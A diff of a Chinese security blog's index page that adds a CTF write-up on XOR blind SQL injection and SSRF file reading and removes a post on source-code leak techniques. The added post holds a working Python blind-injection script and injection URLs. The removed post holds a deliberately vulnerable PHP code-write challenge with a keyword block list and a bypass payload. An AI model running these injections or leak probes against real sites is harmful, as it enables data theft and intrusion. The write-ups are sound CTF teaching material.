@@ -169,6 +169,79 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-异或注入及ssrf读取漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/15/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E5%8F%8Assrf%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  	<time datetime="2021-08-14T16:00:00.000Z" itemprop="datePublished">2021-08-15</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/15/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E5%8F%8Assrf%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+        异或注入或盲注及ssrf读取漏洞
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="异或注入或盲注及ssrf读取漏洞"><a href="#异或注入或盲注及ssrf读取漏洞" class="headerlink" title="异或注入或盲注及ssrf读取漏洞"></a>异或注入或盲注及ssrf读取漏洞</h1><p>通过信息收集，发现有username和password，但是尝试过都不能注入，然后再打开index.html文件，发现有一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/image.php?id=3</span><br></pre></td></tr></table></figure>
+<p>推测此为注入点，然后使用异或注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/image.php?id=1^(ascii(substr((select(database())),1,1))&gt;1)^1</span><br></pre></td></tr></table></figure>
+<p>发现有回显，然后更换参数，直到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/image.php?id=1^(ascii(substr((select(database())),1,1))&gt;99)^1</span><br></pre></td></tr></table></figure>
+<p>没有产生回显，可知数据库第一个字母为1</p>
+<p>以此类推，按原理写一个脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &quot;http://url/image.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;0&#125;,1))&gt;&#123;1&#125;)^1&quot;</span><br><span class="line">word=&quot;&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    l = 32</span><br><span class="line">    h = 128</span><br><span class="line">    mid = (l + h)</span><br><span class="line">    while (l &lt; h):</span><br><span class="line">        nurl=url.format(i,mid)</span><br><span class="line">        r=requests.get(url=nurl)</span><br><span class="line">        if &#x27;JFIF&#x27; in r.text:</span><br><span class="line">            l = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            h = mid</span><br><span class="line">        mid = (l + h) // 2</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">    word += chr(mid)</span><br><span class="line">    print(word)</span><br><span class="line">print(word)</span><br></pre></td></tr></table></figure>
+<p>得到表名为users</p>
+<p>通过修改url的值继续爆破，得到密码值</p>
+<p>而后登录账号，发现是ssrf读取文件漏洞，尝试构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:// /flag</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-cookie语句" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -879,102 +952,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-2021红帽杯find_it（文件泄露和代码审计）" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/2021%E7%BA%A2%E5%B8%BD%E6%9D%AFfind_it%EF%BC%88%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%92%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%89/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/2021%E7%BA%A2%E5%B8%BD%E6%9D%AFfind_it%EF%BC%88%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%92%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%89/">
-        2021红帽杯find_it
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="文件泄露"><a href="#文件泄露" class="headerlink" title="文件泄露"></a>文件泄露</h1><h2 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h2><p>原理：在git init初始化目录时，会生成一个.git目录来记录代码修改情况，如果在上传时没有将.git目录删除的话，就会造成源码泄露</p>
-<p>可以利用的漏洞工具：GitHack<br>一般使用方法为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/.git/index.php</span><br></pre></td></tr></table></figure>
-
-<h2 id="SVN源码泄露"><a href="#SVN源码泄露" class="headerlink" title="SVN源码泄露"></a>SVN源码泄露</h2><p>原理：在用SVN管理本地代码时会生成一个.svn隐藏文件夹，其中有重要的源码信息，如果在发布代码的时候直接复制代码，而没有导出代码的话，就会将源码暴露在外网的环境中，可以利用.svn/entries或/.svn来获取</p>
-<p>可以利用的漏洞工具：Seay SVN漏洞利用工具</p>
-<h2 id="hg源码泄露"><a href="#hg源码泄露" class="headerlink" title="hg源码泄露"></a>hg源码泄露</h2><p>原理：Mercurial是一种轻量级分部版本控制系统，在使用hg init初始化代码时会生成.hg</p>
-<p>漏洞利用工具：dvcs-ripper</p>
-<h2 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h2><p>原理：CVS是一个C/S系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到文件同步的目的。</p>
-<p>可以利用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/CVS/Root    返回根信息</span><br><span class="line"></span><br><span class="line">/CVS/Entries  返回所有文件的结构</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>漏洞利用工具：dvcs-ripper</p>
-<h2 id="Bazaar-bzr泄露"><a href="#Bazaar-bzr泄露" class="headerlink" title="Bazaar/bzr泄露"></a>Bazaar/bzr泄露</h2><p>原理：bzr是一个版本控制工具，可以利用/.bzr/造成源码泄露</p>
-<h2 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h2><p>原理：管理员将网站源代码备份在web目录下</p>
-<p>常见的备份文件后缀：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.txt</span><br><span class="line">.old</span><br><span class="line">.temp</span><br></pre></td></tr></table></figure>
-
-<p>漏洞利用工具：御剑、diramp、dirsearch</p>
-<h2 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h2><p>原理：WEB-INF是java的web应用的安全目录，如果想在页面直接访问文件，需要通过web.xml文件查找访问文件的映射关系</p>
-<p>WEB-INF主要包含文件或目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF/web.xml：web应用程序配置文件，描述了servlet和其他的应用组件配置及命名规则</span><br><span class="line"></span><br><span class="line">WEB-INF/database.propertise：数据库配置文件</span><br><span class="line"></span><br><span class="line">WEB-INF/classes/：一般用来存放在java类文件</span><br><span class="line"></span><br><span class="line">WEB-INF/lib/：用来存放打包好的库</span><br><span class="line"></span><br><span class="line">WEB-INF/src/：用来放源码(.asp和.php等)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="DS-Store文件泄露"><a href="#DS-Store文件泄露" class="headerlink" title="DS_Store文件泄露"></a>DS_Store文件泄露</h2><p>原理：.DS_Store是mac下的finder用来保存展示文件或文件夹的数据文件，每个文件夹下对应一个。如果将DS_Store部署到服务器中，就会造成文件泄露，特别是备份文件、源码文件</p>
-<h2 id="swp文件泄露"><a href="#swp文件泄露" class="headerlink" title="swp文件泄露"></a>swp文件泄露</h2><p>原理：此泄露为vim缓存信息泄露，swp文件是在编辑文件时自动生成的临时文件，当正常退出文件时，临时文件会被删除，但当不正常退出时会保存，利用/.filename.swp，swp文件也可能以swo形式，为.filename.swo</p>
-<p>例子：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php.swp</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Github源码"><a href="#Github源码" class="headerlink" title="Github源码"></a>Github源码</h2><p>原理：很多人将源码放在托管平台托管，所以通过搜索关键字就可以下载网站源码</p>
-<h2 id="phps源码泄露"><a href="#phps源码泄露" class="headerlink" title="phps源码泄露"></a>phps源码泄露</h2><p>构造payload为index.phps，即可得到源码</p>
-<h2 id="数据库文件泄露"><a href="#数据库文件泄露" class="headerlink" title="数据库文件泄露"></a>数据库文件泄露</h2><p>原理：数据库外泄是指数据库文件泄露，比如asp+access框架的数据库文件的泄露，此文件为mdb类型的文件，而SQLite数据库的文件泄露的文件类型是.db，而数据库系统会将数据保存在它们格式的文件中，而数据库文件又在web目录之下,因此可以通过下载数据库来获取数据，以asp+access框架的数据库为例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.某些CMS的目录下存在/data/data.mdb文件，如：ctfshow中的web信息搜集的web20，构造url/db/db.mdb，即可下载，然后用记事本打开</span><br><span class="line">2.ewebeditor后台GETSHELL，下载eweb的数据库就是关键一步</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>一开始先用dirsearch扫描，发现有robots.txtx文件，然后访问发现1ndexx.php，但是当我们构造/1ndexx.php，发现页面没东西，我们可以猜想是不是源码泄露，通过尝试，发现时swp文件泄露，因此构造/1ndexx.php.swp，可以得到源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $link = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;); ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">  body &#123;</span><br><span class="line">    background-color: white;</span><br><span class="line">    text-align: center;</span><br><span class="line">    padding: 50px;</span><br><span class="line">    font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  #logo &#123;</span><br><span class="line">    margin-bottom: 40px;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;img id=&quot;logo&quot; src=&quot;logo.png&quot; /&gt;</span><br><span class="line">  &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;/h1&gt;</span><br><span class="line">  &lt;?php if($link) &#123; ?&gt;</span><br><span class="line">    &lt;h2&gt;I Can&#x27;t view my php files?!&lt;/h2&gt;</span><br><span class="line">  &lt;?php &#125; else &#123; ?&gt;</span><br><span class="line">    &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span><br><span class="line">  &lt;?php &#125; ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">#Really easy...</span><br><span class="line"></span><br><span class="line">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;); //如果打开flag.php文件阅读，文件不在的话会显示权限不够</span><br><span class="line"></span><br><span class="line">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span><br><span class="line"></span><br><span class="line">$a=$_GET[&#x27;code&#x27;];</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123;</span><br><span class="line">  die(&quot;you die&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(strlen($a)&gt;33)&#123;</span><br><span class="line">  die(&quot;nonono.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">fwrite($hack,$a);</span><br><span class="line">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);</span><br><span class="line"></span><br><span class="line">fclose($file);</span><br><span class="line">fclose($hack);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>本来打算绕过正则，但是构造：/index.php?code=<?php phpinfo(); ?><br>就可以在phpinfo()中的全局变量中找到flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">文件泄露及代码审计</a></li></ul>
 	</div>
 
       
